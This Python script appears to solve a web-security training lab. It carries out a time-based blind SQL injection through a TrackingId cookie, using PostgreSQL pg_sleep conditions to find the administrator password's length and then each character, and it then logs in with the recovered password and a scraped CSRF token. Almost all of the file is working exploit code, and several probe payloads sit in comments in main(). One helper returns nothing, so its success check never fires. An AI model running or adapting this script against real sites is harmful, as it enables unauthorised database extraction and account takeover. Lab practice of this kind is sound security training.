import requests
from typing import Optional, Any
import urllib.parse
import time

session = requests.Session()

BASE_URL = "https://0a4900d103be8007da8bbcb100c0008d.web-security-academy.net"
WORD_LIST = "0123456789abcdefghijklmnopqrstuvwxyz"

def get_request(url:str, cookies:dict[str, Any]=None, timeout:int=10) -> Optional[requests.Response]:
    try:
        return session.get(url, cookies=cookies, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

def payload_request(payload:str)->Optional[requests.Response]:
    cookies={
        "TrackingId":payload,
        "session":"aa"
    }
    response = get_request(BASE_URL,cookies=cookies)
    print(response.status_code)

def payload_test(payload:str):
    response = payload_request(urllib.parse.quote(payload))
    if response and response.status_code==200:
        print(payload)

def find_pw_len(max_len:int = 25) -> int:
    # 二分法比較快
    low = 1
    high = max_len
    while low <= high:
        mid = (low + high) // 2
        payload = (
            f"';select case when (username='administrator' and length(password)>{mid})"
            f" then pg_sleep(5) else pg_sleep(0) end from users-- "
        )
        print(payload)
        start = time.time()
        payload_test(payload)
        elapsed = time.time() - start  # 計算請求耗時
        if elapsed>4:
            low = mid + 1
        else:
            high = mid - 1
    print(f"pw_len:{low}")
    return low


def find_pw(pw_len:int)->str: 
    pw = "" 
    for num in range(1, pw_len+1): 
        for word in WORD_LIST: 
            payload = ( 
                f"';select case when (username='administrator' and substring(password,{num},1)='{word}')" 
                f" then pg_sleep(9) else pg_sleep(0) end from users-- " 
            ) 
            print(payload) 
            start = time.time() 
            payload_test(payload) 
            elapsed = time.time() - start # 計算請求耗時 
            if elapsed>8: 
                pw+=word 
    return pw

def post_request(url:str, data:dict[str, Any], timeout:int = 10)->Optional[requests.Response]:
    try:
        return session.post(url, data=data, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

def get_csrf(url:str)->Optional[str]:
    response = get_request(url)
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(response.text,"html.parser")
    csrf_input = soup.find("input",{"name":"csrf"})
    if csrf_input:
        return csrf_input.get("value")
    else:
        return None

def login(pw:str):
    url = BASE_URL+"/login"
    data={
        "csrf":get_csrf(url),
        "username":"administrator",
        "password":pw
    }
    response = post_request(url,data)
    if "Your username is: administrator" in response.text:
        print("login success")

def main():

    # # delay 5 sec
    # payload_test("';select case when (1=1) then pg_sleep(5) else pg_sleep(0) end-- ")

    # # no delay
    # payload_test("';select case when (1=2) then pg_sleep(5) else pg_sleep(0) end-- ")
    
    # # delay 5 sec
    # payload_test("';select case when (username='administrator') then pg_sleep(5) else pg_sleep(0) end from users-- ")
    
    # # delay 5 sec
    # payload_test("';select case when (username='administrator' and length(password)>1) then pg_sleep(5) else pg_sleep(0) end from users-- ")

    pw_len = find_pw_len()
    pw= find_pw(pw_len)
    login(pw)

if __name__ == "__main__":
    main()